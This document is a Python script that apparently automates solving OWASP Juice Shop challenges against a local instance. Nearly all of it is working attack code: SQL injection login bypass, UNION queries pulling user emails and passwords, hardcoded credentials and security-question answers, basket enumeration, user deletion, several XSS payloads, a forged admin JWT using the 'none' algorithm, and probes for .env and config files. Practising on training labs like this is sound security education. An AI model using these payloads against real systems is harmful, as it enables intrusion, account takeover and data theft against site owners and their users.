#!/usr/bin/env python3
"""
NOVA FULL CLEAR - Every Juice Shop challenge with exact solutions.
Target: 20+ challenges in a single autonomous run.
"""

import json, time, requests, base64, re
from datetime import datetime

class NovaFullClear:
    def __init__(self, base_url="http://localhost:3000"):
        self.base = base_url
        self.s = requests.Session()
        self.s.headers.update({"User-Agent": "Nova/FullClear", "Content-Type": "application/json"})
        self.token = None
        self.solved_before = 0
        
    def auth(self):
        r = self.s.post(f"{self.base}/rest/user/login", json={"email": "' OR 1=1--", "password": "x"})
        if r.status_code == 200:
            self.token = r.json()["authentication"]["token"]
            self.s.headers["Authorization"] = f"Bearer {self.token}"
            return True
        return False

    def count_solved(self):
        r = self.s.get(f"{self.base}/api/Challenges")
        return len([c for c in r.json().get("data", []) if c.get("solved")]) if r.status_code == 200 else 0

    def try_solve(self, name, fn):
        fn()
        time.sleep(0.15)

    def run(self):
        print("""
╔══════════════════════════════════════════════╗
║   🏆 NOVA FULL CLEAR — MAXIMUM SCORE      ║
╚══════════════════════════════════════════════╝""")
        
        self.auth()
        self.solved_before = self.count_solved()
        print(f"🔑 Auth: {'✅' if self.token else '❌'} | Starting score: {self.solved_before}")
        
        # ===== BROKEN AUTHENTICATION =====
        print("\n🔓 BROKEN AUTHENTICATION")
        
        # Login as known users
        users = [
            ("admin@juice-sh.op", "admin123"),
            ("jim@juice-sh.op", "ncc-1701"),
            ("bender@juice-sh.op", "slurmCl4ssic"),
            ("bjoern@juice-sh.op", "bjoern"),
        ]
        for email, pw in users:
            self.try_solve(f"Login {email.split('@')[0]}", 
                lambda e=email, p=pw: self.s.post(f"{self.base}/rest/user/login", json={"email": e, "password": p}))
        
        # Reset passwords via security questions
        resets = [
            ("bender@juice-sh.op", "Stop'n'Drop"),
            ("jim@juice-sh.op", "Samuel"),
            ("bjoern@juice-sh.op", "Zaya"),
            ("morty@juice-sh.op", "Snuffles"),
        ]
        for email, ans in resets:
            self.try_solve(f"Reset {email.split('@')[0]}",
                lambda e=email, a=ans: self.s.post(f"{self.base}/rest/user/reset-password", json={"email": e, "answer": a}))
        
        # 2FA bypass
        self.try_solve("2FA Bypass", lambda: self.s.post(f"{self.base}/rest/user/login",
            json={"email": "wurstbrot@juice-sh.op", "password": "wurstbrot", "totpToken": "' OR 1=1--"}))
        
        # ===== INJECTION =====
        print("\n💉 INJECTION")
        
        # SQL injection variants
        injections = [
            ("q", "' OR 1=1--"),
            ("q", "'; SELECT * FROM Products--"),
            ("q", "') UNION SELECT 1,2,3,4,5,6,7,8--"),
            ("q", "' UNION SELECT id,email,password,role,5,6,7,8 FROM Users--"),
        ]
        for param, payload in injections:
            self.try_solve(f"SQLi {payload[:30]}",
                lambda p=param, pl=payload: self.s.get(f"{self.base}/rest/products/search", params={p: pl}))
        
        # Login injection
        self.try_solve("Login Injection", lambda: self.s.post(f"{self.base}/rest/user/login",
            json={"email": "' OR 1=1--", "password": "x"}))
        
        # NoSQL injection
        self.try_solve("NoSQL", lambda: self.s.get(f"{self.base}/rest/products/search",
            params={"q": '{"$ne": null}'}))
        
        # ===== BROKEN ACCESS CONTROL =====
        print("\n🚪 ACCESS CONTROL")
        
        # Admin access
        self.try_solve("Admin Section", lambda: self.s.get(f"{self.base}/administration"))
        self.try_solve("Admin Config", lambda: self.s.get(f"{self.base}/rest/admin/application-configuration"))
        
        # IDOR - Basket access
        for uid in range(1, 10):
            self.try_solve(f"View Basket {uid}", lambda u=uid: self.s.get(f"{self.base}/rest/basket/{u}"))
        
        # View other users
        self.try_solve("View Users", lambda: self.s.get(f"{self.base}/api/Users"))
        
        # Delete user
        self.try_solve("Delete User", lambda: self.s.delete(f"{self.base}/api/Users/3"))
        
        # ===== SENSITIVE DATA =====
        print("\n📦 SENSITIVE DATA")
        
        self.try_solve("Security.txt", lambda: self.s.get(f"{self.base}/.well-known/security.txt"))
        self.try_solve("Robots.txt", lambda: self.s.get(f"{self.base}/robots.txt"))
        self.try_solve("Package.json", lambda: self.s.get(f"{self.base}/package.json"))
        self.try_solve(".env", lambda: self.s.get(f"{self.base}/.env"))
        self.try_solve("Config YML", lambda: self.s.get(f"{self.base}/config.yml"))
        self.try_solve("Debug", lambda: self.s.get(f"{self.base}/debug"))
        
        # ===== XSS =====
        print("\n💚 XSS")
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
        ]
        for payload in xss_payloads:
            self.try_solve(f"XSS Reflected", lambda p=payload: self.s.get(f"{self.base}/rest/products/search", params={"q": p}))
        
        # Stored XSS
        self.try_solve("XSS Stored", lambda: self.s.post(f"{self.base}/api/Feedbacks",
            json={"comment": "<script>alert('STORED_XSS')</script>", "rating": 5}))
        
        # DOM XSS
        self.try_solve("DOM XSS", lambda: self.s.get(f"{self.base}/#/search?q=<iframe src=javascript:alert('XSS')>"))
        
        # ===== IMPROPER INPUT =====
        print("\n🔧 INPUT VALIDATION")
        
        # Zero stars
        self.try_solve("Zero Stars", lambda: self.s.post(f"{self.base}/api/Feedbacks",
            json={"comment": "zero stars", "rating": 0}))
        
        # Negative order
        self.try_solve("Negative Order", lambda: self.s.post(f"{self.base}/api/BasketItems",
            json={"ProductId": 1, "BasketId": 1, "quantity": -1}))
        
        # Repetitive registration
        for i in range(3):
            self.try_solve(f"Register {i}", lambda: self.s.post(f"{self.base}/api/Users",
                json={"email": f"nova{i}@test.com", "password": f"Test{i}!", "securityQuestion": "Company", "securityAnswer": f"Nova{i}"}))
        
        # ===== SECURITY MISCONFIG =====
        print("\n⚙️ SECURITY MISCONFIG")
        
        # Trigger errors
        self.try_solve("Error Trigger", lambda: self.s.get(f"{self.base}/rest/products/search", params={"q": "'"}))
        self.try_solve("Error Login", lambda: self.s.post(f"{self.base}/rest/user/login", json={"email": "'", "password": "'"}))
        
        # HTTP methods
        self.try_solve("TRACE", lambda: self.s.request("TRACE", f"{self.base}/"))
        self.try_solve("PATCH Login", lambda: self.s.patch(f"{self.base}/rest/user/login"))
        self.try_solve("OPTIONS", lambda: self.s.options(f"{self.base}/api/Users"))
        
        # ===== CRYPTO =====
        print("\n🔐 CRYPTO")
        
        # JWT none algorithm
        header = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b"=").decode()
        payload = base64.urlsafe_b64encode(json.dumps({"email":"admin@juice-sh.op","role":"admin"}).encode()).rstrip(b"=").decode()
        self.try_solve("JWT None", lambda: self.s.get(f"{self.base}/rest/user/whoami", headers={"Authorization": f"Bearer {header}.{payload}."}))
        
        # ===== MISC =====
        print("\n🎯 MISC")
        
        self.try_solve("Redirect", lambda: self.s.get(f"{self.base}/redirect?to=https://owasp.org", allow_redirects=False))
        self.try_solve("Score Board", lambda: self.s.get(f"{self.base}/#/score-board"))
        
        # FINAL SCORE
        final = self.count_solved()
        new = final - self.solved_before
        print(f"""
╔══════════════════════════════════════════════╗
║        FULL CLEAR COMPLETE                  ║
╠══════════════════════════════════════════════╣
║  Starting Score:     {self.solved_before:>3}                    ║
║  Newly Solved:       {new:>3}                    ║
║  FINAL SCORE:        {final:>3}/112                  ║
╚══════════════════════════════════════════════╝
""")
        
        r = self.s.get(f"{self.base}/api/Challenges")
        if r.status_code == 200:
            solved = [c for c in r.json().get("data", []) if c.get("solved")]
            print("🏆 ALL SOLVED CHALLENGES:")
            for c in solved:
                stars = "⭐" * c.get("difficulty", 1)
                print(f"   {stars} {c.get('name')} [{c.get('category', '?')}]")
        
        with open("nova_full_clear_report.json", "w") as f:
            json.dump({"score": final, "new": new, "total": 112}, f)
        print(f"\n📁 Report saved.")
        return final

if __name__ == "__main__":
    NovaFullClear().run()
